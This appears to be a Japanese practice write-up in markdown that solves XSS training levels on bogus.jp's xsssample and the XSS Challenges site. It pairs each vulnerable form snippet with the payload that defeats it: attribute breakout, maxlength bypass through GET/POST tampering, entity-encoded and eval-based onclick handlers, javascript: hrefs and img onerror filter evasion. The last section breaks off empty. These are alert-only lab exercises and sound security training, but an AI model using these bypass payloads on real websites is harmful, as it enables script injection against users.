<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [練習](#%E7%B7%B4%E7%BF%92)
  - [xsssample](#xsssample)
    - [1](#1)
    - [2](#2)
    - [3](#3)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# 練習
## xsssample
http://bogus.jp/xsssample/   
writeupは以下   
https://qiita.com/gky360/items/175b8f1b4ca6f71644f4   
### 1 (normal)
http://bogus.jp/xsssample/xsssample_01.php   
![image](https://user-images.githubusercontent.com/56021519/103071017-289c1d80-4606-11eb-86d4-a051e0fdd02c.png)   
普通に`<script>alert(1);</script>`   
### 2 (bypass <input )
http://bogus.jp/xsssample/xsssample_02_M9eec.php   
![image](https://user-images.githubusercontent.com/56021519/103071081-436e9200-4606-11eb-8619-31160c8b6b82.png)   
以下のようにvalueの中に入力がセットされる。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="aaa"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
`a"><script>alert(1);</script>`

### 3 (bypass maxlength="10")
http://bogus.jp/xsssample/xsssample_03_J4Skr.php   
![image](https://user-images.githubusercontent.com/56021519/103071232-8d577800-4606-11eb-89c7-fff87f8644bc.png)   
以下のように10文字以内の制限がある。   
```txt
<form method="get" action="">login<br>
username<input name="user" maxlength="10" type="text" value=""><br>
password<input name="pass" maxlength="10" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
ブラウザからの入力が制限されているだけなので、URL上のGETパラメータの部分に`a"><script>alert(1);</script>`を書く。   
```txt
http://bogus.jp/xsssample/xsssample_03_J4Skr.php?user=a%22%3E%3Cscript%3Ealert(xss);%3C/script%3E&pass=
```
### 4 (bypass "<>")
http://bogus.jp/xsssample/xsssample_04_C_HD-.php   
![image](https://user-images.githubusercontent.com/56021519/103071499-0bb41a00-4607-11eb-8816-c28c47af61d9.png)   
`a"><script>alert(1);</script>`を入れると以下のようなる。どうやら`<>`が使えない。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="a"&gt;&lt;script&gt;alert(1);&lt;/script&gt;"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
以下でBypass。   
```txt
" onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;
" onclick="window.onerror=eval;throw'=alert\x28\x22XSS\x22\x29';
" onclick="alert(xss);
```
### 5 (bypass maxlength="10" with POST)
http://bogus.jp/xsssample/xsssample_05_3S7LA.php   
![image](https://user-images.githubusercontent.com/56021519/103071643-5d5ca480-4607-11eb-96ca-13ad9bceb4b4.png)   
10文字以内の制限があるがPOSTしてるのでBurpで書き換える。   
```txt
word=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```
### 6 (href javascript:)
http://bogus.jp/xsssample/xsssample_06_w6k2v.php   
![image](https://user-images.githubusercontent.com/56021519/103071770-a1e84000-4607-11eb-9926-f8bd7738a304.png)   
以下のように`href`属性の値に入力が入る。   
```txt
<h1><a href="aaa">link</a></h1>
```
以下でいける。   
```txt
javascript:alert('XSS!');
```
### 7 (filter "script")
http://bogus.jp/xsssample/xsssample_07_qqoXM.php   
![image](https://user-images.githubusercontent.com/56021519/103071857-d956ec80-4607-11eb-8e67-b40d9bd48ff0.png)   
<script></script>が弾かれてる   
大文字でもダメそう   
以下のように`<img`タグならいけた   
```txt
<img src="" onerror="alert('XSS!');">
```
### 8 (inject in document.write(''))
http://bogus.jp/xsssample/xsssample_08_sv8ec.php   
![image](https://user-images.githubusercontent.com/56021519/103071941-099e8b00-4608-11eb-9383-bf6b3c8c0525.png)   
以下のように入力がここに入る。なお、`"<>`は使えない。   
```txt
<script>
function hello(){
document.write ('aaa'+"さん");
}
</script>
```
以下でいける。   
```txt
');alert(xss);//
```

## XSS Challenges
### 1 (normal)
![image](https://user-images.githubusercontent.com/56021519/103072436-ea542d80-4608-11eb-94f9-09f21674c770.png)   
`<script>alert(document.domain);</script>`   
### 2 (bypass \<input value="">)
![image](https://user-images.githubusercontent.com/56021519/103072526-11aafa80-4609-11eb-84c1-5aa2f0c6dd17.png)   
`"><script>alert(document.domain);</script>`   
### 3 (inject \<select>tag)
![image](https://user-images.githubusercontent.com/56021519/103072736-8120ea00-4609-11eb-80af-8680a479fc56.png)   
`"><script>alert(document.domain);</script>`をselect countryにいれてもいけるらしい   
POSTを書き換える。   
```txt
p1=a&p2=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
![image](https://user-images.githubusercontent.com/56021519/103072714-7403fb00-4609-11eb-8e86-d7cba0dddb0e.png)   

### 4












